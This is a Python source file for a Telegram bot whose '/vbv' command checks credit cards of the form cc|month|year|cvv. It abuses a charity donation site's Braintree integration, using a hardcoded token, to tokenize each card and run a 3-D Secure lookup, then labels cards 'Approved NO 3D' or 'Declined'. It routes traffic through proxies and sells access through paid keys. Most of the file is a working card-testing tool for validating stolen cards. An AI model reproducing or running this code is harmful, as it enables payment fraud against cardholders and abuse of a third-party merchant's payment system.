from pyrogram import Client
from pyrogram import filters
import time
import re
import requests
from mongoDB import *
from pyrogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from datetime import datetime
import json
from gates.textos import *
import random
import string
import asyncio
import os
from gates.functions.func_bin import get_bin_info
from gates.functions.func_imp import get_time_taken
from gates.functions.func_esdeath import auto_sho_async
import socket


def ocultar_ip(archivo):
    with open(archivo, 'r') as file:
        contenido = file.read().splitlines()

    for proxy in contenido:
        partes = proxy.split(".")
        partes[-1] = ''
        partes[-3] = '.xxxx'
    return ''.join(partes)



async def verificar_proxies(archivo):
    with open(archivo, 'r') as file:
        contenido = file.read().splitlines()

    for proxy in contenido:
        proxy_ip, proxy_port = proxy.split(":")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.settimeout(5)
        sock.connect((proxy_ip, int(proxy_port)))
        return "Live! ✅"
    except socket.error as err:
        return "Dead! ❌", err
    finally:
        sock.close()
        
archivo = "/storage/emulated/0/Pixel_Chk/proxys.txt"  # Reemplaza con la ruta y nombre de tu archivo de texto
verificar_proxies(archivo)

@Client.on_message(filters.command('vbv',prefixes=['.','!','/',',','-','$','%','#']))
async def st(_,message):

    tiempo = time.time()
    

    if message.reply_to_message:
      input = re.findall(r'[0-9]+',str(message.reply_to_message.text))
    else:
      input = re.findall(r'[0-9]+',str(message.text))

    encontrar_usuario = collection.find_one({"_id": message.from_user.id})
    encontrar_comando = collection_cuatro.find_one({"comando": "vbv"})

    #
    if encontrar_usuario is None: return await message.reply(text='<b>You are not currently registered in my database. /register</b>',quote=True)

    estado_comando = encontrar_comando.get("estado")
    if estado_comando == "❌":
        return await message.reply(text="""<b>Command: <code>Stank</code>
Gateway: <code>Vbv Braintree $14.99</code>
Estados: <code>❌</code>
Format: <code>/vbv cc|month|year|cvv.</code></b>""")
        


    encontrar_grupo = collection_tres.find_one({"group": str(message.chat.id)})

    if encontrar_usuario['key'] != 'None' or encontrar_grupo != None:
        if encontrar_usuario['key'] != 'None':
            if encontrar_usuario["key"] < datetime.now():            
                collection.update_one({"_id": message.from_user.id},{"$set": {"key": 'None'}})
                collection.update_one({"_id": message.from_user.id},{"$set": {"antispam": 60}})
                collection.update_one({"_id": message.from_user.id},{"$set": {"plan": 'Free'}})
                return await message.reply(text='<b>your key has expired.</b>',quote=True)
        elif encontrar_grupo["key"] < datetime.now():
            collection_tres.delete_one({"group": str(message.chat.id)})

    else: return await message.reply(text='<b>Contact an administrator to get a key.</b>',quote=True)

    
    alaa = f'''<b>Command: <code>TP</code>
Gateway: <code>Vbv Braintree $14.99</code>
Estados: <code>✅</code>
Format: <code>/vbv cc|month|year|cvv.</code></b>
'''
    if len(input) < 4: return await message.reply(text=alaa,quote=True)      

    tiempo_usuario = int(encontrar_usuario["time_user"])
    spam_time = int(time.time()) - tiempo_usuario
    if spam_time < encontrar_usuario['antispam']:
        tiempo_restante = encontrar_usuario['antispam'] - spam_time
        texto_spam = f"""
<b>[ANTI_SPAM_DETECTED] Try again after <code>{tiempo_restante}</code>'s</b> 
    """
        return await Client.send_message(_,chat_id=message.chat.id,text=texto_spam,reply_to_message_id=message.id)

    collection.update_one({"_id": message.from_user.id},{"$set": {"time_user": int(time.time())}})

    # Buscar el documento cuyo estado sea True
    mensaje_activado = collection_bot.find_one({"status": True})

# Imprimir el mensaje de mantenimiento si se encuentra
    if mensaje_activado:
        reply = await message.reply_text("<b>Cargando proceso...</b>")
    else:
        await message.reply(mensaje_activado["mensaje"])
    await asyncio.sleep(2) 
    archivo = "/storage/emulated/0/Pixel_Chk/proxys.txt"
    ip = ocultar_ip(archivo)
    proxy = await verificar_proxies(archivo)
    
    cc = input[0]
    mes = input[1]
    ano = input[2]
    cvv = input[3]
    req = requests.get(f"https://bins.antipublic.cc/bins/{cc}").json()          
    brand = req['brand']
    country = req['country']
    country_name = req['country_name']
    country_flag = req['country_flag']
    bank = req['bank']
    level = req['level']
    typea  = req['type']
    users = message.from_user.username
    bin = cc[:6]
    moneda = req['country_currencies']
    reqs = requests.get(f"https://lookup.binlist.net/{cc}").json()
    scheme = reqs["scheme"]
    await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Vbv Braintree</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■□□□□□□□ →30%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""")


    x = get_bin_info (cc[0:6])
    reqq = requests.Session()
    
#-----------------------------------------------------------------------------------------------


    with open('/storage/emulated/0/Pixel_Chk/proxys.txt') as f:
        lines = f.readlines()
    for proxs in lines:
        proxies =  {
            'http': f'{proxs}', 
            'https': f'{proxs}'
}
        

    headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'es-ES,es;q=0.6',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTk2NjM2MTUsImp0aSI6ImQ0MjExYzYzLTM1NzYtNDU4Mi1iMzUzLTkxMDM3NGFjNjM3YSIsInN1YiI6Ijg3Zjh4aHI3eGJieGRqemIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijg3Zjh4aHI3eGJieGRqemIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImJhdHRlcnNlYWRvZ3NhbmRjYXRzaG9tZTMifX0.A7HtAuD1TQ7D5tu2SQA9EbDUYEowiv8q4fyTcshQQil3jO8MTRy9in_aRIBsPxRTIxNtRHRwuxc2tHD1f9AA5g',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
}

    json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '397347b2-6295-4688-9559-ce5e0437f1c5',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': f'{cc}',
                'expirationMonth': f'{mes}',
                'expirationYear': f'{ano}',
                'cvv': f'{cvv}',
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

    step1 = reqq.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()

    rs = step1['data']['tokenizeCreditCard']['token']

    print(rs)
    await asyncio.sleep(5)

    await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Vbv Braintree</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■■■■■■■□ →95%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""") 

    
    headers = {
    'authority': 'api.braintreegateway.com',
    'accept': '*/*',
    'accept-language': 'es-ES,es;q=0.6',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://donate.battersea.org.uk',
    'pragma': 'no-cache',
    'referer': 'https://donate.battersea.org.uk/',
    'sec-ch-ua': '"Brave";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
}

    json_data = {
    'amount': 10,
    'additionalInfo': {
        'shippingGivenName': 'Renga',
        'shippingSurname': 'Lopez',
        'billingLine1': 'Street 14',
        'billingLine2': '',
        'billingPostalCode': '10080',
        'billingCountryCode': 'US',
        'billingGivenName': 'Renga',
        'billingSurname': 'Lopez',
        'shippingLine1': 'Street 14',
        'shippingLine2': '',
        'shippingPostalCode': '10080',
        'shippingCountryCode': 'US',
        'email': 'lopeznestar@gmail.com',
    },
    'bin': f'{bin}',
    'dfReferenceId': '1_af91733a-d429-40d0-88ec-80aee12e6593',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.71.1',
        'cardinalDeviceDataCollectionTimeElapsed': 1203,
        'issuerDeviceDataCollectionTimeElapsed': 6593,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE2OTk2NjM2MTUsImp0aSI6ImQ0MjExYzYzLTM1NzYtNDU4Mi1iMzUzLTkxMDM3NGFjNjM3YSIsInN1YiI6Ijg3Zjh4aHI3eGJieGRqemIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Ijg3Zjh4aHI3eGJieGRqemIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6ImJhdHRlcnNlYWRvZ3NhbmRjYXRzaG9tZTMifX0.A7HtAuD1TQ7D5tu2SQA9EbDUYEowiv8q4fyTcshQQil3jO8MTRy9in_aRIBsPxRTIxNtRHRwuxc2tHD1f9AA5g',
    'braintreeLibraryVersion': 'braintree/web/3.71.1',
    '_meta': {
        'merchantAppId': 'donate.battersea.org.uk',
        'platform': 'web',
        'sdkVersion': '3.71.1',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '397347b2-6295-4688-9559-ce5e0437f1c5',
    },
}

    response = reqq.post(
    f'https://api.braintreegateway.com/merchants/87f8xhr7xbbxdjzb/client_api/v1/payment_methods/{rs}/three_d_secure/lookup',
    headers=headers,
    json=json_data,
).json()

    ress = response['paymentMethod']['threeDSecureInfo']['status']
    sta = response['paymentMethod']['threeDSecureInfo']['enrolled']
    
    if ress =="authentication_unavailable":
            res = "Approved NO 3D✅"
    elif ress =="challenge_required":
        res = "Declined 3D❌"
    elif ress =="authenticate_attempt_successful":
        res = "Approved NO 3D✅"
    elif ress == "authenticate_frictionless_failed":
        res = "Declined 3D❌"
    else:
        res = "Declined 3D❌"
        
    keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("📿 Canal", url="https://t.me/+rtV8voEx9vA0ODRh"),
               
            ]
        ]
    )
    await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Vbv Braintree</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■■■■■■■■→100%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""") 
            
               
    await reply.edit_text(f"""<b>🩵Ｈｘｃｋ🩵Ｃｈｋ🩵Ｂｏｔ🩵

<b><a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Card: <code>{cc}|{mes}|{ano}|{cvv}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Status: <code>{res}</code> 
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Reponse: <code>{ress}</code> | <code>{sta}</code>
✄┈┈┈┈┈┈┈┈┈┈┈┈┈┈
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bin: <code>{cc[0:6]}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Type: <code>{x.get("vendor")} / {x.get("type")} / {x.get("level")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Bank : <code>{x.get("bank_name")}</code>
⧼<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Country: <code>{x.get("country")} {x.get("flag")}</code>
⧽<a href="https://t.me/+rtV8voEx9vA0ODRh">ඩා</a>⧽ Gateways: <code> VBV B3 </code>

⪨<a href="https://t.me/+rtV8voEx9vA0ODRh">🜲</a>⪩ User: @{users} [{encontrar_usuario["plan"]}]
<a href="https://t.me/+rtV8voEx9vA0ODRh">━━━━━━༺༻ ━━━━━━</a></b>""", disable_web_page_preview=True, reply_markup=keyboard)